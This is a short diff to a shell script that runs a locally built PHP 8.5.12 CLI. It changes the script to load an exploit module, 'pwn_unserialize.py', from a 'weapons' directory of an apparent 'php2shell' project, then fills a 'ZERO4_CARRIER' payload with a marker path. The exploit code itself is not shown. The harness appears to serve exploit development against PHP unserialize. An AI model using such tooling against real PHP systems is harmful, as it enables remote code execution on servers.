@@ -4,11 +4,14 @@ set -u
 PHP=/tmp/php8512_build/plain2/sapi/cli/php
 W=/tmp/dbg_zero4
 rm -rf $W; mkdir -p $W
-python3 - "$W" <<'PYEOF'
+LAB=$(cd "$(dirname "$0")" && pwd)
+WEAPONS=$(cd "$LAB/.." && pwd)
+python3 - "$W" "$WEAPONS" <<'PYEOF'
 import sys
 w = sys.argv[1]
+weapons = sys.argv[2]
 import importlib.util
-spec = importlib.util.spec_from_file_location("pw", "/mnt/c/Users/andre/Downloads/php2shell-zeros/weapons/pwn_unserialize.py")
+spec = importlib.util.spec_from_file_location("pw", weapons + "/pwn_unserialize.py")
 pw = importlib.util.module_from_spec(spec)
 spec.loader.exec_module(pw)
 s = pw.ZERO4_CARRIER.replace("__MARKER__", "/tmp/.p2s_pwn")
